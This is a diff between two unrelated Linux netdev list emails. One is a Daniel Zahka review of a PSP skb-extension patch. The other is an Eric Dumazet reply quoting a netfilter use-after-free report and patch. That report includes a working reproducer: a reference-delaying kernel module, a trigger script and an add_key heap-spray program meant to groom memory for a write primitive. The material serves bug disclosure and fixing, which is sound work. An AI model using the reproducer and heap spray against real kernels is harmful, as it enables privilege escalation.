@@ -1,55 +1,84 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=100.103.45.18
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.128.173
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1793887769;
-	b=tipGWLzJaKNcNtvxsPfNc/1XK7dINgLYh2ueIgFkncWIa6huC967m3/1aWn7VIve9fIi
-	 HvMek5XMQnpQ9XpwyH1txa5urrzjMvJdVNcjp+slxE+oSEDF4o2i8ZCRgvJnQbo6YeNwv
-	 u4fYu75Gdnm8el1LfBvwRBTrepFCYCUzRwCAD/1hqJIJfvIBji63ujrUlA+EBSiQcCw+6
-	 MC+AfrxqSSV1wfSk5DezwkJBKJ8Ooih3pnBneRT2BEk5Mj9pZnShpntBCLgWGNDpZXmQd
-	 DUt6zxLx2m52YJ42/3BaVsy4cYINVtcz7CglJMHuwX9y2+qpfeNDcr45IUtX8M+bfjw==
+	t=1793887774;
+	b=dRMAiLzDoM/6nin9+StGu5aeHU0HTQYA5VdzvavhD3q1ofo950zCgPzthpn14mG9Eykc
+	 /LuSQl45ygl2OlXODxBjedaEHK9O+WLOsBxu8RBjTh25qxNHvbJFZ2XpyrmkmTwf71CJj
+	 4aXedfmQHrwI9VDvVO9hlCGmpFHuwkRK3N5puectDt7kzmQ3TJ5E8xrUN4R2Mcv4NFxhx
+	 5c3P8vsrq9Sr7ek/FW0/JOiWy89axmHongLbNPakV98wxY3YntTbrMVR9/p41iNEgjeLi
+	 TzRO03wT+RA23XQ26fbFMLM//GcnGIyn6x0A7nX6OErRZ/1I6f6Ruq8VM0SeENXorIA==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1793887769;
-	h=Received:DKIM-Signature:Received:X-Forwarded-Encrypted:
-	 X-Gm-Message-State:X-Received:MIME-Version:References:In-Reply-To:
-	 From:Date:X-Gmail-Original-Message-ID:X-Gm-Features:Message-ID:
-	 Subject:To:Cc:Content-Type:Content-Transfer-Encoding;
-	bh=XvkCqG8Qur/AzCmoRe2tXGXoOuCXGx7iLZbrG3/wjiI=;
-	b=x5w+ncKMR6dBwMbQuRFPbxVnG99K1fX7D2AkH5yHOiZc9PW3iEylkOl7hcmDReM/89Ej
-	 G+U3heJtjaCMLqXaZ5LN6JpwQS0BHgR7AUnrASK+tI1692a5/EeIuXp89UhZt/6Jgbtoo
-	 2HpEFlYFRDKUMkRh/p/LsoJtilTVQeseCMz+IIKKHZ2qh5zjgD7G9MwTE7rRTZVY/Bvv3
-	 HLFT8MehMhrev2MuxMdzWzjv07CnfRVTKMSnC70Fxza3FpwQyenD/qVG3kGVgtqD1fvRt
-	 onRumIvDCwDVMyMyDf4PubvD0cw6I8NwoB2pPR03awRg+Bv7cIUDgPTNZ5pwTGUkPAg==
+	a=rsa-sha256; c=relaxed/relaxed; t=1793887774;
+	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
+	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
+	 Mime-Version:Content-Transfer-Encoding:Content-Type:Date:Message-Id:
+	 Cc:Subject:From:To:X-Mailer:References:In-Reply-To;
+	bh=jzTzN1xi3wWq3rkQo05baaXe4YaAa7XUzbwyEbAc0TE=;
+	b=HU3VIKjOsfKD6enD8M77Y6oSG1So0yRckxLjsfVOlT7tPdbwrIid5H0vpYRMSyIsBW2J
+	 +WqCmXvzG4RPGRxruwUVYErozo5tU9ZIsnAgsu7h57fNOZI6dBKs7/+7BJzuJKwXQ2wYJ
+	 EScEmLOmN7g3q1BenTF5WLzvZ+F5+f4lfLM8mhZ4wOzoyiy2UGtsrLSj6XPfDbTPLgodA
+	 adv12MoOFJgzJIfVMoQq7bgxf0nKsrwDf6ZFvhx3xZfbvJxI7pornvuQvqE68TIEexcwK
+	 wYQnctr3z9TLtvcs1QwTftaMdntUnMumFy+6AQOZz7Ry1FDAaJcrUM/L2HpTZ1n+eew==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
-	dkim=pass header.d=kernel.org header.i=@kernel.org header.a=rsa-sha256 header.s=k20260515 header.b=JzMxT5HJ;
-	arc=none smtp.remote-ip=100.103.45.18
-Received: from smtp.kernel.org (quasi.space.kernel.org [100.103.45.18])
-	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
-	 key-exchange X25519 server-signature ECDSA (prime256v1))
+	dmarc=pass header.from=gmail.com;
+	spf=pass smtp.mailfrom=gmail.com;
+	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=0cDOXOJ7;
+	arc=none smtp.remote-ip=209.85.128.173
+Received: from mail-yw1-f173.google.com (mail-yw1-f173.google.com [209.85.128.173])
+	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
+	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 55F19606A31B
-	for <netdev@vger.kernel.org>; Thu,  5 Nov 2026 14:09:28 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6E748606A32D
+	for <netdev@vger.kernel.org>; Thu,  5 Nov 2026 14:09:34 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 6E748606A32D
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key, unprotected) header.d=kernel.org header.i=@kernel.org header.a=rsa-sha256 header.s=k20260515 header.b=JzMxT5HJ
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id C5C6F1F00A16
-	for <netdev@vger.kernel.org>; Thu,  5 Nov 2026 14:09:27 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
-	s=k20260515; t=1793887767;
-	bh=XvkCqG8Qur/AzCmoRe2tXGXoOuCXGx7iLZbrG3/wjiI=;
-	h=References:In-Reply-To:From:Date:Subject:To:Cc;
-	b=JzMxT5HJx0MVx89U+juQJSfamAEICi2QlzeOipjBhOT1l/AEYsmHUQtQtT3mhUuo0
-	 z40IxsrcJjq1LSZGUQKOmFLfqI8qULpqfos/JuQ+ZtvwNQJaLzdEGqjQ3hHYpeh29t
-	 W6Z7lcpTeHVWEm+ZoDuCNxahxraeigCbU5fW5ip/TfCHr8YaPw3/E1lBrYMRUu9ijR
-	 4ltJSrMGLa8Br8rCVpjqL7CvBAR2044TfnIREjikZuuw7mYe/cb0otG82fq/9p4Bzq
-	 WCSgQ4Mbb9vLAq4C29nrqoLHM4aaFHGdYO+rJE99eJdoChxHxoL9tDKBfHeAHNa5NJ
-	 kspQ+YPsSBucQ==
-Received: by mail-lj1-f174.google.com with SMTP id 38308e7fff4ca-3ab01c46697so18221311fa.1
-        for <netdev@vger.kernel.org>; Thu, 05 Nov 2026 06:09:27 -0800 (PST)
-X-Forwarded-Encrypted: i=1; AKwUvBwnDX6gRntCVvkP242X2RWoEtBKnAjrjqFDozqaOXGItMnFdX1crgiksTAeZzamLZja5wD7bf4=@vger.kernel.org
-X-Gm-Message-State: APuU4Z8tog+J1I9EkPzuxHXhtyJKANxD+INnokV/gtmvtm3Sv7KC+i8n
-	xsKZt+9U9x7P0gQkrrvrNb0FA8G6cQH+oy79ETn35+RlePCx8V/WF5+a5IrPzoYCzcML6jEDdYe
-	sQXGkTgw2c02T31GrrB9pyr8JNWaa6pA=
-X-Received: by 2002:a2e:a9ab:0:b0:3ab:3a7c:a4ca with SMTP id
- 38308e7fff4ca-3acb7ac3fdbmr48815381fa.24.1793887766429; Thu, 05 Nov 2026
- 06:09:26 -0800 (PST)
+	dkim=pass (2048-bit key, unprotected) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=0cDOXOJ7
+Received: by mail-yw1-f173.google.com with SMTP id 00721157ae682-8b2d14968c9so21322387b3.0
+        for <netdev@vger.kernel.org>; Thu, 05 Nov 2026 06:09:34 -0800 (PST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20260707; t=1793887773; x=1794492573; darn=vger.kernel.org;
+        h=in-reply-to:references:to:from:subject:cc:message-id:date
+         :content-type:content-transfer-encoding:mime-version:from:to:cc
+         :subject:date:message-id:reply-to:content-type;
+        bh=jzTzN1xi3wWq3rkQo05baaXe4YaAa7XUzbwyEbAc0TE=;
+        b=0cDOXOJ7kU44pN3CSsJC7LBttdhxXbKwXqvZzda7pHXStgvvBzFoKR4rfQ6uRpzano
+         LqGpNPg3W+CWu4WnyQkkbdSjRVXu+jvbvdx7LlzpaLxR3UBCncfBpxp7F1bVC1zR+7KP
+         tOpqvK21hn3041JvnCXOIHZ1DQ5S6efh+xzD106W6QtWm527wUoE+KbI3Pdx4pboCUeH
+         J7c0+EJi+hdBXYKg14ZCJ4Ab8oTgUC5Gw4DUJ4Tani6wz1FCcrxCBb2CybU5Tt8NB3w9
+         r7i4x3Fi0TP87AzY+Xgmvr0Itmnv4T5QoEgJdD1/ShixhE8u4yftXQKAkHFGDsmbERx0
+         3s4A==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1793887773; x=1794492573;
+        h=in-reply-to:references:to:from:subject:cc:message-id:date
+         :content-type:content-transfer-encoding:mime-version:x-gm-gg
+         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
+         :content-type;
+        bh=jzTzN1xi3wWq3rkQo05baaXe4YaAa7XUzbwyEbAc0TE=;
+        b=Uk1iCea8P0KWoaeSzKSp6NzLA368zjdzdSppftdzAwgUDt8bAN4zNsHbbMn05oiJ5K
+         ddOFyKDCfdopfOEJ0xFU9jokroTKtdjBJwO2We2YI9/HSQWSllp4KwGEe5hBcLnTPTL6
+         viG8ksWacZ+bG4ERGFlFf22h6lgyWCF+Xr3WL3Pw2XdbV62Pp+pwqTqIIRFVQQfqsPyL
+         feGpwwrHbUdRBvqF0PdMiSx6NdHi2kXbYIMsMix8RNBBlm4L01TMgJarCRc1N5hSTV4u
+         nCAy84/VN6iODE7IDBS48AmJfcgEZPdTJiZB7Jh4iYPDFSckqEHQ20LfITAoblx4aUGK
+         xaNw==
+X-Forwarded-Encrypted: i=1; AKwUvBxx36bEOO2gFGt0dMA0o7cJwb66p8W+Eebdj5qKSC5dzk4tRB0HXN8Yd7LRV+shWMSho4yohas=@vger.kernel.org
+X-Gm-Message-State: APuU4Z+fCBAtKZwIm24kv0tuhdnG5LLzbSmKBjFhTryip8qyYN0zoLzn
+	q+0HNahBPe22sbpD5YviEN57YAYSHGvgmgtk2J+kuEP4PlDDiuYNRx/G
+X-Gm-Gg: AYBFou1Njy41Q8uFnWcJxMoOgP/gml3cTdHJ3JVn3QNmzVN1mOFUzFhOxURC22JLyA8
+	asRVa7nvjfzJXV4MaSl5u9BpSuF4dUe7tvb80H72oKuO2rUjX6S2oNrW/E213+wFoiYaNsU2xDt
+	UqKCYEMLCjQZWzOsOYZAQ1+JC8TT7OjH21ex/nGDYU6zjDUHYp18i4QL2gNjS0M/rsBeXQMzl6U
+	eB9AVfBgufYcfVNfK7DF9wBAMUba6lx+dhtUa1wBWjvKEQcd/IYwxTT99mF4hlEmKim70e1buvR
+	j1sSsEI5qeGitDk3c/0KUJ665BOwaBLzStdYiu7lT0pROeADgoNL61gOt2wjD/RdD8T/7n5aXkh
+	FaoCynd3VTBWC1AMSmOOUpOFRZ2u1/QcqoATLoJdE67SzPjw4eW6gpfy9rI8tG2HcOdcjTLjclP
+	YqqGSEDJsHDbFTBeft3XySOEijzsWhcY2pnpbgBLostb02usaz3pJmpzvPFTjTb5ts3l0R99ghm
+	egVy3fbw2AQafWYHDePq/nGJc6yXFbaEfbbLrjMVhJ54eD3HTeWU8RqKfC9NYBomMFotkhRfLrx
+	3dM8mB82snTeZ5w2SBLF3j6djAu5gfKKUQ==
+X-Received: by 2002:a05:690e:1444:b0:679:b98d:9b7f with SMTP id 956f58d0204a3-67ba4c82e34mr11758102d50.11.1793887773314;
+        Thu, 05 Nov 2026 06:09:33 -0800 (PST)
+Received: from localhost ([2600:4040:9399:4000:e553:72e5:7d37:c7ef])
+        by smtp.gmail.com with ESMTPSA id 00721157ae682-8b309712e33sm40372397b3.4.2026.11.05.06.09.32
+        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
+        Thu, 05 Nov 2026 06:09:32 -0800 (PST)
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Post: <mailto:netdev@vger.kernel.org>
@@ -58,424 +87,141 @@ List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 List-Owner: <mailto:netdev+owner@vger.kernel.org>
 Precedence: list
-MIME-Version: 1.0
-References: <20261105114817.3033625-1-bsdhenrymartin@gmail.com>
- <aux2zX3dLKYnzG56@chamomile> <CAEnQdOox6ddd_GScf24z65bocnMvX0KHeDTju_8j3bzQjLi0HQ@mail.gmail.com>
-In-Reply-To: <CAEnQdOox6ddd_GScf24z65bocnMvX0KHeDTju_8j3bzQjLi0HQ@mail.gmail.com>
-From: Eric Dumazet <edumazet@kernel.org>
-Date: Thu, 5 Nov 2026 15:09:13 +0100
-X-Gmail-Original-Message-ID: <CAL4Wiir+91dO7AVVq3O86bWu9NC+8Z+kFUeYveJqfW44-5ChvQ@mail.gmail.com>
-X-Gm-Features: AclHuK_Xwgo_6rj5ZBvRIGUbs5ntI7NEXVoZOfO4mdFCJNfTsi5voi6FCacCUho
-Message-ID: <CAL4Wiir+91dO7AVVq3O86bWu9NC+8Z+kFUeYveJqfW44-5ChvQ@mail.gmail.com>
-Subject: Re: [PATCH] netfilter: nf_tables: fix pernet use-after-free on
- UNREGISTER rebroadcast
-To: henry martin <bsdhenrymartin@gmail.com>
-Cc: Pablo Neira Ayuso <pablo@netfilter.org>, fw@strlen.de, davem@davemloft.net, kuba@kernel.org, 
-	pabeni@redhat.com, netfilter-devel@vger.kernel.org, coreteam@netfilter.org, 
-	netdev@vger.kernel.org, stable@vger.kernel.org
-Content-Type: text/plain; charset="UTF-8"
+Mime-Version: 1.0
 Content-Transfer-Encoding: quoted-printable
+Content-Type: text/plain; charset=UTF-8
+Date: Thu, 05 Nov 2026 09:09:26 -0500
+Message-Id: <DMNC538FF7AS.2JZQJXNEZG6P6@gmail.com>
+Cc: "Simon Horman" <horms@kernel.org>, "Jakub Sitnicki"
+ <jakub@cloudflare.com>, "Daniel Zahka" <daniel.zahka@gmail.com>, "Willem de
+ Bruijn" <willemb@google.com>, <netdev@vger.kernel.org>,
+ <linux-kselftest@vger.kernel.org>, <linux-kernel@vger.kernel.org>,
+ <bpf@vger.kernel.org>
+Subject: Re: [PATCH net v2 1/2] net: Make PSP skb extension survive packet
+ scrubbing
+From: "Daniel Zahka" <daniel.zahka@gmail.com>
+To: "Wei Wang" <weiwan@google.com>, "David S . Miller"
+ <davem@davemloft.net>, "Jakub Kicinski" <kuba@kernel.org>, "Paolo Abeni"
+ <pabeni@redhat.com>, "Andrew Lunn" <andrew+netdev@lunn.ch>, "Shuah Khan"
+ <shuah@kernel.org>
+X-Mailer: aerc 0.21.0-threadmapfix
+References: <20261030043145.2185700-1-weiwan@google.com>
+ <20261030043145.2185700-2-weiwan@google.com>
+In-Reply-To: <20261030043145.2185700-2-weiwan@google.com>
 
-Le jeu. 5 nov. 2026 =C3=A0 14:15, henry martin <bsdhenrymartin@gmail.com> a=
- =C3=A9crit :
+On Fri Oct 30, 2026 at 12:31 AM EDT, Wei Wang wrote:
+> skb_scrub_packet() drops all skb extensions unconditionally via
+> skb_ext_reset(). It runs on tunnel encap/decap (ip_tunnel_rcv, vxlan_rcv,
+> etc.) and virtual device forwarding/redirection (dev_forward_skb,
+> netkit_xmit, skb_do_redirect).
 >
-> Hi Pablo,
+> When a virtual device such as netkit is associated with a PSP device in
+> another network namespace via PSP_CMD_DEV_ASSOC, incoming PSP packets
+> decapsulated by psp_dev_rcv() lose their SKB_EXT_PSP extension when
+> scrubbed during redirection into the peer netns. Without SKB_EXT_PSP,
+> __psp_sk_rx_policy_check() rejects incoming TCP data segments at the
+> socket layer with SKB_DROP_REASON_PSP_INPUT.
 >
-> Full reproducer below; runs as root in a KASAN guest. Verified on
-> v7.4-rc1 (6628e7d4c6b2c): unpatched, the quoted splat (freed by
-> net_passive_dec <- cleanup_net); patched, zero reports and all three
-> notifiers hit the new guard 91/91/91 times over the rebroadcast window.
+> Introduce a static skb_ext_scrub() helper in net/core/skbuff.c to
+> preserve SKB_EXT_PSP across skb_scrub_packet() while dropping all other
+> extensions. If SKB_EXT_PSP is not active, skb_ext_scrub() simply calls
+> skb_ext_reset(). If SKB_EXT_PSP is the only extension in the skb_ext
+> buffer, nothing needs to be scrubbed. Otherwise, save the PSP metadata,
+> reset the extension block, and re-add a fresh SKB_EXT_PSP extension (or
+> clear skb->decrypted if the allocation fails).
 >
-> delayer.ko only simulates a driver holding a reference with a delay
-> across NETDEV_UNREGISTER - the same delay source as the netdevsim
-> case in the original netdev-genl syzbot report; it is an environment
-> aid, not part of the bug.
+> Fixes: 06c2dce2d0f6 ("psp: add new netlink cmd for dev-assoc and dev-disa=
+ssoc")
+> Link: https://lore.kernel.org/r/20260910-bpf-meta-inside-skb-ext-v2-3-0b2=
+1e42180b0@cloudflare.com
+> Reported-by: Daniel Zahka <daniel.zahka@gmail.com>
+> Closes: https://lore.kernel.org/netdev/DLODSKPY6ON6.1G6SP3CFFLCPJ@gmail.c=
+om/
+> Co-developed-by: Jakub Sitnicki <jakub@cloudflare.com>
+> Signed-off-by: Jakub Sitnicki <jakub@cloudflare.com>
+> Signed-off-by: Wei Wang <weiwan@google.com>
+> ---
+>  net/core/skbuff.c | 31 +++++++++++++++++++++++++++++--
+>  1 file changed, 29 insertions(+), 2 deletions(-)
 >
-> 1) delayer.c - helper module (build: make -C <kernel tree> M=3D$PWD modul=
-es):
->
-> // delayer.c - holds a device reference with a delay across NETDEV_UNREGI=
-STER
-> #include <linux/module.h>
-> #include <linux/kernel.h>
-> #include <linux/netdevice.h>
-> #include <linux/workqueue.h>
->
-> static char *watch_dev =3D "vethA";
-> module_param(watch_dev, charp, 0444);
-> static int delay_secs =3D 15;
-> module_param(delay_secs, int, 0444);
->
-> static void delayer_put(struct work_struct *w);
-> static struct delayed_work dw;
-> static struct net_device *held;
->
-> static void delayer_put(struct work_struct *w)
-> {
-> if (held) {
-> pr_info("delayer: dev_put %s\n", held->name);
-> dev_put(held);
-> held =3D NULL;
-> }
-> }
->
-> static int delayer_event(struct notifier_block *nb, unsigned long ev, voi=
-d *ptr)
-> {
-> struct net_device *dev =3D netdev_notifier_info_to_dev(ptr);
->
-> if (ev =3D=3D NETDEV_UNREGISTER && !strcmp(dev->name, watch_dev) && !held=
-) {
-> dev_hold(dev);
-> held =3D dev;
-> schedule_delayed_work(&dw, delay_secs * HZ);
-> pr_info("delayer: holding %s for %ds\n", dev->name, delay_secs);
-> }
-> return NOTIFY_DONE;
-> }
->
-> static struct notifier_block delayer_nb =3D { .notifier_call =3D delayer_=
-event };
->
-> static int __init delayer_init(void)
-> {
-> INIT_DELAYED_WORK(&dw, delayer_put);
-> return register_netdevice_notifier(&delayer_nb);
-> }
->
-> static void __exit delayer_exit(void)
-> {
-> cancel_delayed_work_sync(&dw);
-> unregister_netdevice_notifier(&delayer_nb);
-> if (held)
-> dev_put(held);
-> }
->
-> module_init(delayer_init);
-> module_exit(delayer_exit);
-> MODULE_LICENSE("GPL");
->
-> 2) repro.sh - the trigger (prerequisite: insmod delayer.ko
-> watch_dev=3DvethA delay_secs=3D60):
->
-> #!/bin/bash
-> set -e
-> ip link add vethA type veth peer name vethB
-> ip link set vethB up
-> ip netns add A
-> ip link set vethA netns A
-> ip -n A link set lo up
-> ip -n A link set vethA up
-> dmesg -C
-> ip link del vethB &
-> sleep 0.5
-> ip netns del A
-> sleep 20
-> dmesg | grep -cE 'KASAN|BUG: '
->
-> 3) sprayer.c - heap groom for the write leg only, not needed for the
->    splat (sprays user_key_payload, kmalloc-256 non-cg):
->
-> // sprayer.c - spray kmalloc-256 non-cg objects via add_key
-> #include <stdio.h>
-> #include <stdlib.h>
-> #include <string.h>
-> #include <unistd.h>
-> #include <sys/syscall.h>
-> #define __NR_add_key 248
-> #define PLEN 216
-> int main(int argc, char **argv) {
->     unsigned char buf[PLEN];
->     memset(buf, argc > 1 ? argv[1][0] : 'A', PLEN);
->     int n =3D argc > 2 ? atoi(argv[2]) : 3000;
->     int ids =3D 0;
->     for (int i =3D 0; i < n; i++) {
->         char desc[32];
->         snprintf(desc, sizeof(desc), "spray_%d", i);
->         long r =3D syscall(__NR_add_key, "user", desc, buf, PLEN, -2);
->         if (r >=3D 0) ids++;
->     }
->     printf("sprayed %d keys\n", ids);
->     pause();
->     return 0;
-> }
->
-> Run: insmod delayer.ko watch_dev=3DvethA delay_secs=3D60; ( ./sprayer A
-> 4000 & ); bash repro.sh
->
-> Thanks,
-> Henry
->
-> Pablo Neira Ayuso <pablo@netfilter.org> =E4=BA=8E2026=E5=B9=B411=E6=9C=88=
-5=E6=97=A5=E5=91=A8=E5=9B=9B 20:30=E5=86=99=E9=81=93=EF=BC=9A
-> >
-> > On Thu, Nov 05, 2026 at 07:48:17PM +0800, Henry Martin wrote:
-> > > A device unregistered outside its netns teardown can be stuck in
-> > > netdev_wait_allrefs_any() while the pernet exit handlers of its
-> > > netns run to completion.  The nftables pernet storage is freed on
-> > > that path.  The rebroadcasts then hit the nf_tables netdev
-> > > notifiers (base chain, flowtable, offload), which read the freed
-> > > storage via nft_pernet() and take commit_mutex on it, e.g. on
-> > > mainline v7.4-rc1 (KASAN build):
-> > >
-> > >     BUG: KASAN: slab-use-after-free in nf_tables_netdev_event+0x17c
-> > >     Read of size 8 at addr ffff88811061c980 by task ip/422
-> > >     Call Trace:
-> > >      nf_tables_netdev_event+0x17c/0x1c0
-> > >     Freed by task 62:
-> > >      kfree+0x161/0x450
-> > >      net_passive_dec+0xe5/0x180
-> > >      cleanup_net+0x45a/0x780
-> >
-> > Could ypu pass on a reproducer?
-> >
-> > > Skip the rebroadcasts in all three notifiers, which are the only
-> > > NETDEV_UNREGISTER events delivered with reg_state =3D=3D
-> > > NETREG_UNREGISTERED.  This mirrors commit fd0909e963ed8
-> > > ("netdev-genl: ignore NETDEV_UNREGISTER rebroadcasts").
-> > >
-> > > This issue was discovered by Tencent CodeBuddy Security.
-> > >
-> > > Fixes: 8a4fc54b07d75 ("net: get rid of rtnl_lock_unregistering()")
-> > > Cc: stable@vger.kernel.org
-> > > Signed-off-by: Henry Martin <bsdhenrymartin@gmail.com>
-> > > ---
-> > >  net/netfilter/nf_tables_api.c     | 9 +++++++++
-> > >  net/netfilter/nf_tables_offload.c | 8 ++++++++
-> > >  net/netfilter/nft_chain_filter.c  | 9 +++++++++
-> > >  3 files changed, 26 insertions(+)
-> > >
-> > > diff --git a/net/netfilter/nf_tables_api.c b/net/netfilter/nf_tables_=
-api.c
-> > > index 59ac623e6805f..e43a1b9fefc36 100644
-> > > --- a/net/netfilter/nf_tables_api.c
-> > > +++ b/net/netfilter/nf_tables_api.c
-> > > @@ -9902,6 +9902,15 @@ static int nf_tables_flowtable_event(struct no=
-tifier_block *this,
-> > >           event !=3D NETDEV_CHANGENAME)
-> > >               return NOTIFY_DONE;
-> > >
-> > > +     /* netdev_wait_allrefs_any() rebroadcasts NETDEV_UNREGISTER
-> > > +      * while waiting for the last references to be dropped; the
-> > > +      * netns and its nftables pernet storage may already be torn
-> > > +      * down by then.
-> > > +      */
-> > > +     if (event =3D=3D NETDEV_UNREGISTER &&
-> > > +         READ_ONCE(dev->reg_state) =3D=3D NETREG_UNREGISTERED)
-> > > +             return NOTIFY_DONE;
-> > > +
-> > >       net =3D dev_net(dev);
-> > >       nft_net =3D nft_pernet(net);
-> > >       mutex_lock(&nft_net->commit_mutex);
-> > > diff --git a/net/netfilter/nf_tables_offload.c b/net/netfilter/nf_tab=
-les_offload.c
-> > > index 0ac3c26dfb3d1..d360e233d0366 100644
-> > > --- a/net/netfilter/nf_tables_offload.c
-> > > +++ b/net/netfilter/nf_tables_offload.c
-> > > @@ -672,6 +672,14 @@ static int nft_offload_netdev_event(struct notif=
-ier_block *this,
-> > >       if (event !=3D NETDEV_UNREGISTER)
-> > >               return NOTIFY_DONE;
-> > >
-> > > +     /* netdev_wait_allrefs_any() rebroadcasts NETDEV_UNREGISTER
-> > > +      * while waiting for the last references to be dropped; the
-> > > +      * netns and its nftables pernet storage may already be torn
-> > > +      * down by then.
-> > > +      */
-> > > +     if (READ_ONCE(dev->reg_state) =3D=3D NETREG_UNREGISTERED)
-> > > +             return NOTIFY_DONE;
-> > > +
-> > >       nft_net =3D nft_pernet(net);
-> > >       mutex_lock(&nft_net->commit_mutex);
-> > >       chain =3D __nft_offload_get_chain(nft_net, dev);
-> > > diff --git a/net/netfilter/nft_chain_filter.c b/net/netfilter/nft_cha=
-in_filter.c
-> > > index e04e689f22284..b3cfe8d426753 100644
-> > > --- a/net/netfilter/nft_chain_filter.c
-> > > +++ b/net/netfilter/nft_chain_filter.c
-> > > @@ -412,6 +412,15 @@ static int nf_tables_netdev_event(struct notifie=
-r_block *this,
-> > >           event !=3D NETDEV_CHANGENAME)
-> > >               return NOTIFY_DONE;
-> > >
-> > > +     /* netdev_wait_allrefs_any() rebroadcasts NETDEV_UNREGISTER
-> > > +      * while waiting for the last references to be dropped; the
-> > > +      * netns and its nftables pernet storage may already be torn
-> > > +      * down by then.
-> > > +      */
-> > > +     if (event =3D=3D NETDEV_UNREGISTER &&
-> > > +         READ_ONCE(dev->reg_state) =3D=3D NETREG_UNREGISTERED)
-> > > +             return NOTIFY_DONE;
-> > > +
-> > >       nft_net =3D nft_pernet(dev_net(dev));
-> > >       mutex_lock(&nft_net->commit_mutex);
+> diff --git a/net/core/skbuff.c b/net/core/skbuff.c
+> index 93c2f440b9ec..5c4a2e982ebc 100644
+> --- a/net/core/skbuff.c
+> +++ b/net/core/skbuff.c
+> @@ -6369,6 +6369,32 @@ bool skb_try_coalesce(struct sk_buff *to, struct s=
+k_buff *from,
+>  }
+>  EXPORT_SYMBOL(skb_try_coalesce);
+> =20
+> +static void skb_ext_scrub(struct sk_buff *skb)
+> +{
+> +#if IS_ENABLED(CONFIG_INET_PSP)
+> +	struct psp_skb_ext *pse =3D skb_ext_find(skb, SKB_EXT_PSP);
+> +
+> +	if (pse) {
+> +		struct skb_ext *ext =3D skb->extensions;
+> +		struct psp_skb_ext tmp =3D *pse;
 
-Instead of working around the problem, what about fixing it in the core?
+I would move the copy just before skb_ext_reset(skb), but it probably
+won't make a difference in the generated code.
 
-commit bbe8af9893694c807435178eb428c42d3305db97
-Author: Eric Dumazet <edumazet@kernel.org>
-Date:   Thu Nov 5 13:44:07 2026 +0100
+> +
+> +		/* Nothing else to scrub if PSP is the only extension in ext. */
+> +		if (ext->chunks =3D=3D SKB_EXT_CHUNKSIZEOF(*ext) +
+> +				   skb_ext_type_len[SKB_EXT_PSP])
+> +			return;
+> +
+> +		skb_ext_reset(skb);
+> +		pse =3D skb_ext_add(skb, SKB_EXT_PSP);
+> +		if (pse)
+> +			memcpy(pse, &tmp, sizeof(*pse));
+> +		else
+> +			skb->decrypted =3D 0;
 
-    net: wait for in-flight device unregistrations before netns dismantle
+Agree with sashiko not to clear decrypted. It would at least prevent the
+skb from being forwarded cleartext back onto the network.
 
-    A device can be unregistered by a context other than the cleanup_net()
-    of its own netns, for instance a veth whose peer in another netns is
-    deleted. If references on it are still held, it stays in
-    netdev_wait_allrefs_any(), which rebroadcasts NETDEV_UNREGISTER every
-    second.
-
-    Meanwhile its netns can be dismantled: default_device_exit_batch()
-    only takes care of devices still listed in the netns, then pernet exit
-    handlers free their state, and finally struct net is freed while the
-    device still points to it.
-
-    The rebroadcasts then run notifiers against torn down pernet state, or
-    freed memory. Two instances were reported so far:
-
-     - netdev_genl_netdevice_event(): net->genl_sock is NULL [1]
-     - nh_netdev_event(): net->nexthop.devhash is NULL [2]
-
-    but any notifier using dev_net(dev) is affected, as is
-    netdev_wait_allrefs_any() itself (__rtnl_net_lock(dev_net(dev)) with
-    CONFIG_DEBUG_NET_SMALL_RTNL=3Dy).
-
-    This was prevented by rtnl_lock_unregistering() until I removed it
-    in commit 8a4fc54b07d7 ("net: get rid of rtnl_lock_unregistering()"),
-    considering only the loopback dependency, and missing the notifiers one=
-.
-
-    Restore a per-netns counter of devices sitting in netdev_run_todo(),
-    and make default_device_exit_batch() wait for it to reach zero, after
-    it has unregistered all devices of the dying netns(es). At this point
-    no new unregistration can be started for these netns.
-
-    Unlike the old barrier, this only waits for devices of the netns being
-    dismantled and runs after their own devices are gone.
-
-    Tested on a KASAN kernel with a debug-only hack holding a reference
-    on a veth device for 5 seconds after its unregistration: a nexthop
-    on the veth in netns X, delete its peer from init_net, then delete X.
-    Without this patch, the nexthop_flush_dev() null-ptr-deref from [2]
-    triggers. With it, no splat; netns churn and dismantle of a netns
-    whose own device is held still work.
-
-    [1] https://lore.kernel.org/netdev/6adf9f64.6200f071.51519.0ed1.GAE@goo=
-gle.com/
